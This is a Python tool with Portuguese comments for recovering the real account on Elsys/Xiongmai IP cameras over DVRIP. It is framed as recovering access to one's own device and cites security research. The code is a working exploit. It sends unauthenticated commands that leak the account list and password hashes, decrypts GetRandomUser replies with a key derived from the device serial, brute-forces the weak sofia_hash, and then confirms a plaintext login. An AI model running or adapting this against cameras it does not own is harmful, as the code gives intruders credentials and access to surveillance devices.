# -*- coding: utf-8 -*-
"""
recupera_conta_elsys.py  -  Tenta recuperar a CONTA REAL de uma camera Elsys
                            (login RSA / DVRIP-FutureHome) SEM precisar de RSA,
                            sem captura PCAPdroid e sem risco de 205.

IDEIA (ver GUIA_COMPLETO.md secao 9.7 e secao 10)
-------------------------------------------------
A Elsys e Xiongmai igual as iCSee. Em firmwares V5.0x.R02 o comando `Users`
(msg 1470) responde SEM login (SessionID 0x00000000) e entrega a lista de
contas com o HASH de cada senha - inclusive a conta REAL (4 letras, memo
"admin 's account"). Isso NAO e um login, entao nao arrisca 205.

Com o nome e o hash em maos, a senha (sempre [a-z0-9]{6}) sai por forca-bruta
do hash em poucos minutos. Tambem tenta o GetRandomUser (1660), que, se a
camera deixar sem login, ja devolve a senha em TEXTO (descriptografada com a
chave do numero de serie, igual nas iCSee).

No fim, loga por DVRIP-Web (texto puro) com a conta recuperada para CONFIRMAR -
a Elsys aceita esse login (ela respondia 203 = senha errada, nao "algoritmo
invalido"), entao com a senha certa deve dar 100.

Fontes (engenharia reversa / pesquisa de seguranca, verificadas ao vivo):
  github.com/Raizer1996/xm210-camera-research  (msg 1470 sem login - Finding 1)
  github.com/voidnullvalue/Icsee-android        (GetRandomUser + AES do serial)

USO (com a sessao do projeto FECHADA):
  python ferramentas\\recupera_conta_elsys.py 192.168.3.119 --serial 2c9fea3d01e8fa07 --crack
"""
import argparse
import base64
import hashlib
import itertools
import json
import socket
import struct
import sys
import time

PORTA = 34567
LOGIN = 1000
USERS = 1470            # lista de contas (vaza sem login nas firmwares R02)
RANDOMUSER = 1660       # GetRandomUser (texto puro da conta, se deixar sem login)

CODIGOS = {100: "OK", 515: "OK", 102: "metodo nao suportado (corrigido nessa firmware)",
           203: "senha errada / precisa login", 205: "bloqueado (205)"}


def descreve(ret):
    return "%s (%s)" % (ret, CODIGOS.get(ret, "?"))


# ---------------- framing DVRIP (igual ao projeto) ----------------
def sofia_hash(senha):
    chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
    h = hashlib.md5(senha.encode("utf-8")).digest()
    return "".join(chars[(h[i] + h[i + 1]) % 62] for i in range(0, 16, 2))


def _corpo(obj):
    if isinstance(obj, str):
        return obj.encode("utf-8") + b"\x0a\x00"
    return json.dumps(obj, ensure_ascii=False, separators=(",", ":")).encode("utf-8") + b"\x0a\x00"


def _envia(sock, session, seq, msgid, obj):
    payload = _corpo(obj)
    cab = bytearray(20)
    cab[0] = 255
    struct.pack_into("<I", cab, 4, session)
    struct.pack_into("<I", cab, 8, seq)
    struct.pack_into("<H", cab, 14, msgid)
    struct.pack_into("<I", cab, 16, len(payload))
    sock.sendall(bytes(cab) + payload)


def _le_exato(sock, n):
    buf = b""
    while len(buf) < n:
        b = sock.recv(n - len(buf))
        if not b:
            raise ConnectionError("a camera fechou a conexao")
        buf += b
    return buf


def _le_pacote(sock):
    cab = _le_exato(sock, 20)
    if cab[0] != 255:
        raise ConnectionError("pacote invalido")
    msgid = struct.unpack_from("<H", cab, 14)[0]
    tam = struct.unpack_from("<I", cab, 16)[0]
    corpo = _le_exato(sock, tam) if tam else b""
    return msgid, corpo


def _json(corpo):
    txt = corpo.rstrip(b"\x00\n\r ").decode("utf-8", "replace")
    try:
        return json.loads(txt)
    except ValueError:
        return {"__bruto__": txt[:400]}


def _pede_sem_login(ip, msgid, nome, timeout=8):
    """Abre conexao, manda UM comando com SessionID 0, le a resposta, fecha."""
    s = socket.create_connection((ip, PORTA), timeout=timeout)
    try:
        s.settimeout(timeout)
        _envia(s, 0, 0, msgid, {"Name": nome, "SessionID": "0x00000000"})
        for _ in range(4):
            _, corpo = _le_pacote(s)
            r = _json(corpo)
            if nome in r or "Ret" in r or "__bruto__" in r:
                return r
        return {}
    finally:
        s.close()


# ---------------- GetRandomUser (texto puro via AES do serial) ----------------
def deriva_chave(serial):
    if len(serial) < 12:
        return None
    return serial[5:11] + serial[1:7] + serial[8:12]


def descriptografa_conta(info_b64, serial):
    try:
        from Crypto.Cipher import AES
    except ImportError:
        print("  [!] Falta pycryptodome (pip install pycryptodome).")
        return None
    chave = deriva_chave(serial)
    if not chave or len(chave) != 16:
        print("  [!] Serial com formato inesperado (%r)." % serial)
        return None
    try:
        aes = AES.new(chave.encode("ascii"), AES.MODE_CBC, b"\x00" * 16)
        claro = aes.decrypt(base64.b64decode(info_b64)).decode("ascii", "replace")
    except Exception as e:
        print("  [!] Nao descriptografou: %s" % e)
        return None
    import re
    u = re.search(r"p1:(\S*)", claro)
    p = re.search(r"p2:(\S*)", claro)
    if u and p and u.group(1) and p.group(1):
        return u.group(1), p.group(1)
    return None


# ---------------- quebra do hash (senha [a-z0-9]{N}) ----------------
def quebra_hash(alvo_hash, charset, tamanhos):
    """Procura a senha cujo sofia_hash == alvo_hash. Retorna a senha ou None."""
    alvo = alvo_hash.strip()
    md5 = hashlib.md5
    tab = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
    inicio = time.time()
    testadas = 0
    for n in tamanhos:
        total = len(charset) ** n
        print("    tamanho %d: %d combinacoes..." % (n, total))
        for tupla in itertools.product(charset, repeat=n):
            s = "".join(tupla)
            h = md5(s.encode()).digest()
            hh = "".join(tab[(h[i] + h[i + 1]) % 62] for i in range(0, 16, 2))
            if hh == alvo:
                print("    achou em %.0fs (%d testadas)" % (time.time() - inicio, testadas))
                return s
            testadas += 1
            if testadas % 2000000 == 0:
                vel = testadas / (time.time() - inicio + 0.01)
                print("      ... %d testadas (%.0f mil/s)" % (testadas, vel / 1000))
    return None


def login_dvrip_web(ip, usuario, senha, timeout=8):
    """Testa login por DVRIP-Web (texto puro). Retorna Ret."""
    s = socket.create_connection((ip, PORTA), timeout=timeout)
    try:
        s.settimeout(timeout)
        obj = {"EncryptType": "MD5", "LoginType": "DVRIP-Web",
               "PassWord": sofia_hash(senha), "UserName": usuario}
        _envia(s, 0, 0, LOGIN, obj)
        _, corpo = _le_pacote(s)
        return _json(corpo).get("Ret")
    finally:
        s.close()


# ------------------------------------------------------------------
def main():
    ap = argparse.ArgumentParser(description="Recupera a conta real de uma Elsys sem RSA.")
    ap.add_argument("ip", help="IP da camera Elsys, ex: 192.168.3.119")
    ap.add_argument("--serial", default=None, help="numero de serie (app Elsys > Sobre o disp.)")
    ap.add_argument("--crack", action="store_true", help="quebrar a senha do hash (poucos min)")
    ap.add_argument("--charset", default="abcdefghijklmnopqrstuvwxyz0123456789")
    ap.add_argument("--tamanhos", default="6", help="tamanhos de senha a testar, ex: 6 ou 6,8")
    args = ap.parse_args()

    print("=" * 64)
    print(" RECUPERAR CONTA REAL (ELSYS, sem RSA)  -  %s" % args.ip)
    print("=" * 64)

    # --- 1) GetRandomUser sem login (se a camera deixar, ja vem em texto) ---
    if args.serial:
        print("[1] GetRandomUser (1660) sem login + serial ...")
        try:
            r = _pede_sem_login(args.ip, RANDOMUSER, "GetRandomUser")
            bloco = r.get("GetRandomUser") or {}
            info = bloco.get("Info") or bloco.get("InfoUser")
            if info:
                conta = descriptografa_conta(info, args.serial)
                if conta:
                    print("    >>> conta real (texto): usuario=%s senha=%s" % conta)
                    _fim(args.ip, *conta)
                    return
            print("    (sem login nao veio; Ret=%s) - seguindo para o 1470." % r.get("Ret"))
        except OSError as e:
            print("    (falhou: %s) - seguindo." % e)

    # --- 2) Users (1470) sem login: lista de contas + hash ---
    print("[2] Users (1470) sem login ...")
    try:
        r = _pede_sem_login(args.ip, USERS, "Users")
    except OSError as e:
        print("    [X] nao conectei: %s" % e)
        sys.exit(1)
    usuarios = r.get("Users")
    if not usuarios:
        print("    [X] A camera NAO vazou a lista (Ret=%s)." % descreve(r.get("Ret")))
        print("        Resposta: %r" % r)
        print("        -> Essa firmware corrigiu o 1470. Caminho alternativo: rodar o")
        print("           GetRandomUser (1660) DENTRO da sessao RSA do elsys_xm.py.")
        sys.exit(2)

    print("    Contas encontradas:")
    real = None
    for u in usuarios:
        nome, memo, h = u.get("Name"), u.get("Memo", ""), u.get("Password", "")
        print("      - %-10s grupo=%-7s memo=%-20r hash=%s" % (nome, u.get("Group"), memo, h))
        if nome != "admin" and ("account" in memo.lower() or len(str(nome)) == 4):
            real = u
    if not real:
        print("    [!] Nao identifiquei a conta real automaticamente (veja a lista acima).")
        sys.exit(3)

    user_real = real.get("Name")
    hash_real = real.get("Password")
    print("    >>> conta real: usuario=%s  hash=%s" % (user_real, hash_real))

    if not args.crack:
        print("\n    Para achar a senha, rode de novo com --crack (quebra o hash, poucos min).")
        return

    # --- 3) quebra do hash ---
    print("[3] Quebrando a senha (sofia_hash) ...")
    tamanhos = [int(x) for x in args.tamanhos.split(",")]
    senha = quebra_hash(hash_real, args.charset, tamanhos)
    if not senha:
        print("    [X] Nao achei nos tamanhos %s. Tente --tamanhos 6,7,8." % tamanhos)
        sys.exit(4)
    print("    >>> SENHA: %s" % senha)
    _fim(args.ip, user_real, senha)


def _fim(ip, usuario, senha):
    print("[4] Confirmando login DVRIP-Web (texto puro) ...")
    try:
        ret = login_dvrip_web(ip, usuario, senha)
        if ret in (100, 515):
            print("    >>> LOGIN OK (Ret 100)! A Elsys loga por texto puro - RSA nao e mais preciso.")
        else:
            print("    [!] Login deu Ret %s. A conta/senha esta certa, mas talvez a Elsys" % descreve(ret))
            print("        exija DVRIP-FutureHome (RSA) mesmo para ela. Me mande este resultado.")
    except OSError as e:
        print("    [!] Nao testei o login (%s)." % e)
    print("-" * 64)
    print(" Se logou, no config.py (a cam1 e Elsys):")
    print("   CAM_ADMIN_USUARIO = %r   # (precisa ligar no servidor - me avise)" % usuario)
    print("   CAM_ADMIN_SENHA   = %r" % senha)
    print("=" * 64)


if __name__ == "__main__":
    main()
